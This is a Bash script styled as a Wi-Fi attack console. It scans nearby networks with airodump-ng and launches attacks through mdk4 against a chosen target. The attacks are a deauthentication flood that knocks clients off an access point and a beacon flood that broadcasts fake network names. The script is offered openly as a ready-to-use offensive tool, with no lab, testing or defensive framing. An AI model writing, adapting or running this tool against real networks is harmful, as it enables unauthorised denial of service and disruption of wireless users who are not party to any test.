#!/bin/bash

# --- CONFIGURATION ---
IFACE="wlan0mon"
TEMP_FILE="/tmp/wifi_scan_final"

# --- COLOR PALETTE ---
RED='\033[0;31m'
L_RED='\033[1;31m'
WHITE='\033[1;37m'
GRAY='\033[1;30m'
NC='\033[0m'
BG_RED='\033[41m'

# --- STATUS INDICATORS ---
SYS="[${L_RED}SYSTEM${NC}]"
REQ="[${L_RED}INPUT${NC}]"
ACT="[${L_RED}ATTACK${NC}]"

# --- ANIMATION: PROGRESS BAR ---
pro_progress() {
    local width=50
    echo -e "\n${SYS} ${WHITE}PREPARING ATTACK VECTOR...${NC}"
    for ((i=0; i<=100; i+=5)); do
        local filled=$((i * width / 100))
        local empty=$((width - filled))
        printf "\r    ${RED}▕"
        printf "${L_RED}%${filled}s" | tr ' ' '█'
        printf "${GRAY}%${empty}s" | tr ' ' '░'
        printf "${RED}▏ ${WHITE}${i}%%${NC}"
        sleep 0.03
    done
    echo -e "\n\n${ACT} ${L_RED}STRIKE AUTHORIZED!${NC}\n"
    sleep 1
}

# --- FUNCTION: BANNER ---
show_banner() {
    clear
    echo -e "${RED}"
    echo "  ██╗    ██╗██╗███████╗██╗   █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗"
    echo "  ██║    ██║██║██╔════╝██║  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝"
    echo "  ██║ █╗ ██║██║█████╗  ██║  ███████║   ██║      ██║   ███████║██║     █████═╝ "
    echo "  ██║███╗██║██║██╔══╝  ██║  ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ "
    echo "  ╚███╔███╔╝██║██║     ██╗  ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗"
    echo "   ╚══╝╚══╝ ╚═╝╚═╝     ╚              ╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝"
    echo -e "  ${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ${L_RED}OVERLORD EDITION v5.0 ${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo -e "  ${WHITE}INTERFACE: ${L_RED}${IFACE}${WHITE} | STATUS: ${L_RED}READY${NC}"
    echo ""
}

# --- FUNCTION: HOME ---
home() {
    show_banner
    echo -e "   ${RED}[01] ${WHITE}NETWORK ANALYSIS (SCAN SECTOR)${NC}"
    echo -e "   ${RED}[02] ${WHITE}SHUTDOWN SYSTEM${NC}"
    echo ""
    echo -ne "   ${L_RED}┌──(${WHITE}Overlord@Root${L_RED})─[${WHITE}~/HOME${L_RED}]\n   └─╼ ${NC}"
    read choice

    case $choice in
        1|01) scan_wifi ;;
        2|02) echo -e "\n${SYS} Goodbye, Operator."; exit 0 ;;
        *) home ;;
    esac
}

# --- FUNCTION: SCANNING ---
scan_wifi() {
    show_banner
    echo -e "   ${SYS} ${WHITE}Scanning Frequencies...${NC}"
    echo -e "   ${SYS} ${WHITE}Press ${L_RED}CTRL+C${WHITE} to Lock Target List.${NC}\n"
    sleep 1
    
    sudo airodump-ng $IFACE --write $TEMP_FILE --output-format csv &
    SCAN_PID=$!
    
    trap "sudo kill $SCAN_PID > /dev/null 2>&1" SIGINT
    wait $SCAN_PID 2>/dev/null
    trap - SIGINT

    after_scan_menu
}

# --- FUNCTION: AFTER SCAN ---
after_scan_menu() {
    show_banner
    echo -e "   ${GRAY}╔━━━━━━━━━━━━━━━━━━ ${L_RED}TARGETING GRID ${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗${NC}"
    echo -e "   ${L_RED}   BSSID              CH    PWR    SSID${NC}"
    echo -e "   ${GRAY}   ───────────────────────────────────────────────────────────────────${NC}"
    
    if [ -f "${TEMP_FILE}-01.csv" ]; then
        awk -F, 'NR>1 && $1!="" && $1!="BSSID" {printf "   \033[1;37m %-18s \033[0;31m %-4s \033[1;30m %-6s \033[1;31m %-20s\n", $1, $4, $9, $14}' "${TEMP_FILE}-01.csv" | head -n 15
        rm ${TEMP_FILE}-01.*
    else
        echo -e "   ${L_RED}   [!] NO DATA FOUND. CHECK MONITOR MODE.${NC}"
    fi
    echo -e "   ${GRAY}╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝${NC}"
    
    echo -e "\n   ${RED}[01] ${WHITE}PROCEED TO ATTACK COMMANDS${NC}"
    echo -e "   ${RED}[02] ${WHITE}RETURN TO HOME FRAME${NC}"
    echo ""
    echo -ne "   ${L_RED}┌──(${WHITE}Overlord@Root${L_RED})─[${WHITE}~/TARGETS${L_RED}]\n   └─╼ ${NC}"
    read opt

    case $opt in
        1|01) attack_menu ;;
        2|02) home ;;
        *) after_scan_menu ;;
    esac
}

# --- FUNCTION: ATTACK MENU ---
attack_menu() {
    show_banner
    echo -e "   ${GRAY}╭─────────────────── ${L_RED}ATTACK VECTORS ${GRAY}──────────────────╮${NC}"
    echo -e "   ${GRAY}│ ${RED}[01] ${WHITE}DEAUTH STRIKE (DISCONNECT TARGET)   ${GRAY}│"
    echo -e "   ${GRAY}│ ${RED}[02] ${WHITE}MULTI-BEACON GHOSTING (FAKE APs)    ${GRAY}│"
    echo -e "   ${GRAY}╰──────────────────────────────────────────╯${NC}"
    echo ""
    echo -ne "   ${L_RED}┌──(${WHITE}Overlord@Root${L_RED})─[${WHITE}~/EXPLOIT${L_RED}]\n   └─╼ ${NC}"
    read atk_choice

    if [[ "$atk_choice" == "1" || "$atk_choice" == "01" ]]; then
        echo -ne "\n   ${REQ} ${WHITE}TARGET BSSID   : ${NC}"
        read bssid
        echo -ne "   ${REQ} ${WHITE}TARGET CHANNEL : ${NC}"
        read channel
        echo -ne "   ${REQ} ${WHITE}PACKET SPEED   : ${NC}"
        read packets
        
        pro_progress
        
        # Attack with Interruption Handler
        echo -e "   ${ACT} ${L_RED}ATTACKING $bssid... Press CTRL+C to Stop.${NC}"
        sudo mdk4 $IFACE d -B $bssid -c $channel -s $packets &
        ATK_PID=$!
        
        trap "sudo kill $ATK_PID > /dev/null 2>&1; echo -e '\n\n${SYS} Attack Interrupted.'; post_attack_choice" SIGINT
        wait $ATK_PID 2>/dev/null
        trap - SIGINT

    elif [[ "$atk_choice" == "2" || "$atk_choice" == "02" ]]; then
        echo -e "\n   ${SYS} ${WHITE}GHOSTING MODE: Enter SSID names separated by commas.${NC}"
        echo -ne "   ${REQ} ${WHITE}Example (WiFi_A,Free_Hotspot,Hacked): ${NC}"
        read ssid_input
        
        # Convert comma to newline for mdk4 list
        echo "$ssid_input" | tr ',' '\n' > fake_list.txt
        
        pro_progress
        echo -e "   ${ACT} ${L_RED}BROADCASTING GHOST NETWORKS... Press CTRL+C to Stop.${NC}"
        sudo mdk4 $IFACE b -f fake_list.txt &
        ATK_PID=$!
        
        trap "sudo kill $ATK_PID > /dev/null 2>&1; echo -e '\n\n${SYS} Ghosting Interrupted.'; post_attack_choice" SIGINT
        wait $ATK_PID 2>/dev/null
        trap - SIGINT
    else
        home
    fi
}

# --- FUNCTION: POST ATTACK CHOICE ---
post_attack_choice() {
    echo -e "\n   ${GRAY}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
    echo -e "   ${GRAY}┃ ${L_RED}[01] ${WHITE}RESUME / CHOOSE NEW ATTACK    ${GRAY}┃"
    echo -e "   ${GRAY}┃ ${L_RED}[02] ${WHITE}RETURN TO HOME FRAME          ${GRAY}┃"
    echo -e "   ${GRAY}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
    echo ""
    echo -ne "   ${L_RED}┌──(${WHITE}Overlord@Root${L_RED})─[${WHITE}~/POST-STRIKE${L_RED}]\n   └─╼ ${NC}"
    read post_opt

    case $post_opt in
        1|01) attack_menu ;;
        2|02) home ;;
        *) home ;;
    esac
}

# --- ROOT CHECK ---
if [ "$EUID" -ne 0 ]; then 
  echo -e "${BG_RED}${WHITE} [!] FATAL ERROR: ROOT PRIVILEGES REQUIRED [!] ${NC}"
  exit 1
fi

# START SYSTEM
home